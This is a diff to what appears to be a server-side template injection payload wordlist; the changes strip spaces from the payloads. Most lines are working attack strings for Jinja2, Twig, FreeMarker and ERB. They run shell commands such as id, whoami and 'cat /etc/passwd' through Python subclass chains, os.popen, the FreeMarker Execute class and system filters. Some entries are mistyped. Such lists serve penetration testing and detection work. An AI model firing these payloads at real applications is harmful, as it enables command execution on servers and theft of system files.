@@ -13,50 +13,50 @@ ${= 3*3}
 #{3*3}
 #{7+7}
 #{{7*7}}
-#{ 3 * 3 }
+#{3*3}
 #{{7*7}}
-#{{ '7'*7 }}
+#{{'7'*7}}
 [=7*7]
 [[3*3]]
 *{7*7}
 {{= 7*7}}
 {{7*7}}
-{{ '7'*7 }}
+{{'7'*7 }}
 {{2*2}}[[3*3]]
 {{3*'3'}}
 {{dump(app)}}
 {{app.request.server.all|join(',')}}
 {{config.items()}}
-{{ [].class.base.subclasses() }}
+{{[].class.base.subclasses()}}
 {{''.class.mro()[1].subclasses()}}
-{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{''.__class__.__mro__[2].__subclasses__() }}
 {{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}
-{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
+{% for key, value in config.iteritems() %}<dt>{{key|e }}</dt><dd>{{value|e }}</dd>{% endfor %}
 {{'a'.toUpperCase()}} 
-{{ request }}
+{{request}}
 {{self}}
 {{dump(app)}}
-{{ [] .class.base.subclassesO }}
+{{[] .class.base.subclassesO }}
 {{''.class.mro()[l] .subclassesO}}
 for c in [1,2,3] %}{{ c,c,c }}{% endfor %}
-{{ []._class.base.subclasses_O }}
+{{[]._class.base.subclasses_O }}
 {{['id']|filter('system')}}
 <%= File.open('id').read %>
 <%= File.open('whoami').read %>
 <%= File.open('/etc/passwd').read %>
-<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
-<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("whoami")}
-[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
-[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('whoami')}
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("whoami")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('whoami')}
 ${"freemarker.template.utility.Execute"?new()("id")}
 ${"freemarker.template.utility.Execute"?new()("whoami")}
 {{app.request.query.filter(0,0,1024,{'options':'system'})}}
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('id').read() }}
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('whoami').read() }}
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
-{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("id").read() }}
-{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("whoami").read() }}
-{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
+{{''.__class__.__mro__[2].__subclasses__()[40]('id').read() }}
+{{''.__class__.__mro__[2].__subclasses__()[40]('whoami').read() }}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("id").read() }}
+{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("whoami").read() }}
+{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
 {{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
 {{config.__class__.__init__.__globals__['os'].popen('pwd').read()}}
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
